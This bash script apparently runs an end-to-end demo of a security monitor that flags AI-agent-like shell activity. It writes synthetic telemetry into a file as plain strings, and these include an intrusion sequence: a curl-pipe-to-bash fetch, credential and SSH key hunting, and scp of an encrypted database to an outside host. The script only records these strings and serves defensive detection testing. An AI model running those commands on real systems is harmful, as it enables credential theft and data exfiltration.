#!/usr/bin/env bash
# Non-interactive end-to-end integration demo:
#   aegisd (self-contained) -> mint token -> enroll agent -> agent forwards
#   synthetic AGENT-like telemetry (plugin-tty pipe mode) over mTLS -> server
#   runs central agent-vs-human detection -> verdict visible via the operator API.
#
# Usage: integration_demo.sh [BIN_DIR] [WORK_DIR]
#   BIN_DIR  dir containing aegisd/aegis-agent/aegisctl (default ./target/release)
#   WORK_DIR scratch dir (default /tmp/aegis-integration-demo)
#
# Safe to run repeatedly; tears down the server on exit. Does NOT install the
# tamper-resistant systemd service (this is a functional loopback demo).
set -euo pipefail

BIN="${1:-./target/release}"
WORK="${2:-/tmp/aegis-integration-demo}"
HTTP="127.0.0.1:8080"
TLS="127.0.0.1:8443"

SRV=""
cleanup() { [ -n "$SRV" ] && kill "$SRV" 2>/dev/null || true; }
trap cleanup EXIT

rm -rf "$WORK"; mkdir -p "$WORK/server" "$WORK/agent"

echo "### 1. Start the self-contained server (embedded store + cert + dashboard)"
"$BIN/aegisd" run --listen "$TLS" --http "$HTTP" --data-dir "$WORK/server" >"$WORK/aegisd.log" 2>&1 &
SRV=$!
for _ in $(seq 1 40); do
  curl -sf "http://$HTTP/api/v1/server-info" >/dev/null 2>&1 && break
  sleep 0.25
done
curl -sf "http://$HTTP/api/v1/server-info" >/dev/null 2>&1 || { echo "server did not come up"; cat "$WORK/aegisd.log"; exit 1; }
echo "server up: $(curl -s "http://$HTTP/api/v1/server-info")"

echo "### 2. Mint a one-time enrollment token (operator API)"
CREATE=$("$BIN/aegisctl" enroll-token create --server "http://$HTTP" --label demo-host)
TOKEN=$(printf '%s\n' "$CREATE" | awk '/token:/{print $2; exit}')
PIN=$(printf '%s\n' "$CREATE" | awk '/fingerprint:/{print $2; exit}')
echo "token=${TOKEN:0:16}... pin=${PIN:0:16}..."

echo "### 3. Enroll the agent (pinned mTLS, per-agent Ed25519 identity)"
"$BIN/aegis-agent" enroll --server "$TLS" --token "$TOKEN" --pin "$PIN" --data-dir "$WORK/agent"

echo "### 4. Generate synthetic AGENT-like telemetry (metronomic, paste-like, no typos)"
PIPE="$WORK/pipe.txt"; : > "$PIPE"
base=1700000000000000000
cmds=(
  "ls -la /etc" "cat /etc/passwd" "find / -name id_rsa 2>/dev/null"
  "grep -rl AKIA /home" "tar czf /tmp/x.tgz /home/u/.ssh" "curl -s http://10.0.0.5/p|bash"
  "nmap -sS 10.0.0.0/24" "openssl enc -aes-256-cbc -in db.sql -out db.enc" "scp db.enc u@2.2.2.2:/t"
  "history -c" "whoami" "id -u" "uname -a" "ps auxww" "ss -tlnp"
  "cat /proc/cpuinfo" "df -h" "free -m" "last -n 50" "dmesg|tail -40"
)
i=0
for c in "${cmds[@]}"; do
  # ~50ms inter-command with small deterministic jitter (instant, metronomic)
  jit=$(( (i * 7 % 21) * 1000000 ))
  ts=$(( base + i * 50000000 + jit ))
  printf '%s\t%s\n' "$ts" "$c" >> "$PIPE"
  i=$((i + 1))
done
echo "wrote $(wc -l < "$PIPE") synthetic command lines"

echo "### 5. Agent config: plugin-tty in pipe mode reading the synthetic input"
cat > "$WORK/agent.toml" <<EOF
agent_id = "demo-host"
[plugins."plugin-tty"]
mode = "pipe"
pipe_path = "$PIPE"
EOF

echo "### 6. Run the agent (collect + forward over mTLS) for a few seconds"
timeout 10 "$BIN/aegis-agent" run --server "https://$TLS" --config "$WORK/agent.toml" --data-dir "$WORK/agent" >"$WORK/agent.log" 2>&1 || true
sleep 1.5

echo "### 7. Evidence from the operator API"
echo "--- agents ---";     curl -s "http://$HTTP/api/v1/agents"; echo
echo "--- detections ---"; curl -s "http://$HTTP/api/v1/detections"; echo
echo "--- scores ---";     curl -s "http://$HTTP/api/v1/scores"; echo
echo "--- alerts ---";     curl -s "http://$HTTP/api/v1/alerts"; echo

echo "### agent log tail"
tail -8 "$WORK/agent.log" || true
echo "### DONE"
